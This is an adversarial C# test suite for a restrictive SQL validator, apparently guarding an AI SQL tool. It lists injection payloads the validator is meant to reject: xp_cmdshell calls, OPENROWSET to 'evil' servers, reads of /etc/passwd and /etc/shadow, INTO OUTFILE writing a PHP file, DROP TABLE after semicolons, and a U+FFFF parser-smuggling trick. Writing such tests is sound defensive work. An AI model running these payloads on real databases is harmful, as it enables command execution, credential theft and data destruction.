using Tnzi.AI.Tools.Sql;
using MsOptions = Microsoft.Extensions.Options.Options;

namespace Tnzi.AI.Tests.Tools.Sql;

/// <summary>
/// Adversarial test suite - covers the bypass payloads the previous regex-tokenizer validator
/// missed. Every payload here MUST be rejected by <see cref="RestrictiveSqlValidator"/>;
/// any failure is a security regression.
/// </summary>
public class AdversarialSqlValidatorTests
{
    private readonly RestrictiveSqlValidator _tsql = new(MsOptions.Create(new SqlToolOptions()));

    private readonly RestrictiveSqlValidator _allDialects = new(MsOptions.Create(new SqlToolOptions
    {
        AllowNonTSqlDialects = true
    }));

    // ─── T-SQL specific dangerous functions / table refs ──────────────────────

    [Theory]
    [InlineData("SELECT * FROM OPENROWSET('SQLNCLI', 'Server=evil', 'SELECT 1')")]
    [InlineData("SELECT * FROM OPENDATASOURCE('SQLNCLI11','Data Source=evil').master.dbo.syslogins")]
    [InlineData("SELECT * FROM OPENQUERY([linked], 'SELECT 1')")]
    [InlineData("SELECT * FROM OPENXML(1, '/x', 1) WITH (id int)")]
    public void TSql_RejectsOpenRowsetFamily(string sql)
    {
        var result = _tsql.Validate(sql);
        Assert.False(result.IsValid, $"Expected rejection but got valid for: {sql}");
    }

    [Theory]
    [InlineData("SELECT xp_cmdshell('whoami')")]
    [InlineData("SELECT sp_oacreate('x', null)")]
    [InlineData("SELECT sp_executesql('SELECT 1')")]
    [InlineData("SELECT sp_addlinkedserver('evil')")]
    [InlineData("EXEC sp_executesql N'DROP TABLE x'")]
    [InlineData("EXEC xp_cmdshell 'whoami'")]
    public void TSql_RejectsDangerousProcedurePrefixes(string sql)
    {
        var result = _tsql.Validate(sql);
        Assert.False(result.IsValid, $"Expected rejection but got valid for: {sql}");
    }

    [Theory]
    [InlineData("SELECT fn_xe_file_target_read_file(N'\\\\evil\\share\\f.xel', null, null, null)")]
    [InlineData("SELECT fn_get_audit_file('audit.sqlaudit', null, null)")]
    public void TSql_RejectsDangerousBuiltInFunctions(string sql)
    {
        var result = _tsql.Validate(sql);
        Assert.False(result.IsValid, $"Expected rejection but got valid for: {sql}");
    }

    // ─── Multi-batch / multi-statement / EXEC ─────────────────────────────────

    [Theory]
    [InlineData("SELECT 1; SELECT 2")]
    [InlineData("SELECT 1\nGO\nSELECT 2")]
    [InlineData("SELECT 1; DROP TABLE users")]
    public void TSql_RejectsMultiStatementOrBatch(string sql)
    {
        var result = _tsql.Validate(sql);
        Assert.False(result.IsValid);
    }

    /// <summary>
    /// ScriptDom 180.140.0 之前的词法分析器把 U+FFFF 当成输入结束：塞进注释或语句中间，解析器只看到前半段
    /// 那条 SELECT（零错误、单条语句），校验通过，而执行端执行的是整串原文，后面的 DROP 照样落到数据库上。
    /// 降回受影响的版本时这里必须变红。载荷在方法体里拼：U+FFFF 不是合法的 XML 字符，放进 InlineData 会妨碍测试发现。
    /// </summary>
    [Fact]
    public void TSql_RejectsStatementsSmuggledPastANonCharacter()
    {
        const char nonCharacter = '\uFFFF';
        string[] payloads =
        [
            $"SELECT 1 -- {nonCharacter}\nDROP TABLE users",
            $"SELECT 1 /* {nonCharacter} */; DROP TABLE users",
            $"SELECT 1 {nonCharacter}; DROP TABLE users",
            $"SELECT '{nonCharacter}'; DROP TABLE users",
        ];

        foreach (var sql in payloads)
        {
            Assert.False(_tsql.Validate(sql).IsValid, $"Accepted: {sql.Replace(nonCharacter, '#')}");
        }
    }

    [Theory]
    [InlineData("EXEC ('SELECT 1')")]
    [InlineData("EXECUTE sp_who")]
    public void TSql_RejectsExecuteStatements(string sql)
    {
        var result = _tsql.Validate(sql);
        Assert.False(result.IsValid);
    }

    // ─── Comment / literal embedded keywords (must NOT bypass) ────────────────
    // ScriptDom AST never sees text inside /* */ or 'literal' as keywords, so these are
    // syntactically valid SELECTs and SHOULD pass - proving the parser is doing its job.

    [Theory]
    [InlineData("SELECT /*INSERT*/ 1")]
    [InlineData("SELECT 1 -- DROP TABLE users")]
    [InlineData("SELECT 'DROP TABLE x' AS msg")]
    [InlineData("SELECT 'EXEC xp_cmdshell' AS payload")]
    public void TSql_AcceptsHarmlessKeywordsInsideLiteralsOrComments(string sql)
    {
        var result = _tsql.Validate(sql);
        Assert.True(result.IsValid, $"Expected valid but rejected with: {result.ErrorMessage}");
    }

    // ─── Non-T-SQL dialects (tokenizer fallback) ──────────────────────────────

    [Theory]
    [InlineData(SqlDialect.PostgreSql, "SELECT pg_read_file('/etc/passwd')")]
    [InlineData(SqlDialect.PostgreSql, "SELECT pg_sleep(86400)")]
    [InlineData(SqlDialect.PostgreSql, "SELECT pg_terminate_backend(pid) FROM pg_stat_activity")]
    [InlineData(SqlDialect.PostgreSql, "SELECT lo_import('/etc/shadow')")]
    [InlineData(SqlDialect.PostgreSql, "COPY users TO '/tmp/leak'")]
    public void NonTSql_RejectsPostgresDangerousFunctions(SqlDialect dialect, string sql)
    {
        var result = _allDialects.Validate(sql, dialect);
        Assert.False(result.IsValid, $"Expected rejection but got valid for: {sql}");
    }

    [Theory]
    [InlineData(SqlDialect.MySql, "SELECT load_file('/etc/passwd')")]
    [InlineData(SqlDialect.MySql, "SELECT * FROM users INTO OUTFILE '/var/www/x.php'")]
    [InlineData(SqlDialect.MySql, "SELECT * FROM users INTO DUMPFILE '/tmp/y'")]
    [InlineData(SqlDialect.MySql, "SELECT sleep(60)")]
    [InlineData(SqlDialect.MySql, "SELECT benchmark(1000000, MD5('x'))")]
    public void NonTSql_RejectsMySqlDangerousFunctions(SqlDialect dialect, string sql)
    {
        var result = _allDialects.Validate(sql, dialect);
        Assert.False(result.IsValid, $"Expected rejection but got valid for: {sql}");
    }

    [Theory]
    [InlineData(SqlDialect.PostgreSql, "SELECT 1 /* INSERT */")]
    [InlineData(SqlDialect.PostgreSql, "SELECT 'pg_read_file' AS s")]
    [InlineData(SqlDialect.MySql, "SELECT '''; DROP TABLE x; --' AS s")]
    public void NonTSql_TokenizerStripsLiteralsAndComments(SqlDialect dialect, string sql)
    {
        var result = _allDialects.Validate(sql, dialect);
        Assert.True(result.IsValid, $"Expected valid but rejected with: {result.ErrorMessage}");
    }

    [Theory]
    [InlineData(SqlDialect.PostgreSql, "SELECT 1; DROP TABLE users")]
    [InlineData(SqlDialect.MySql, "SELECT 1; DELETE FROM users WHERE 1=1")]
    public void NonTSql_RejectsMidQuerySemicolon(SqlDialect dialect, string sql)
    {
        var result = _allDialects.Validate(sql, dialect);
        Assert.False(result.IsValid);
    }

}
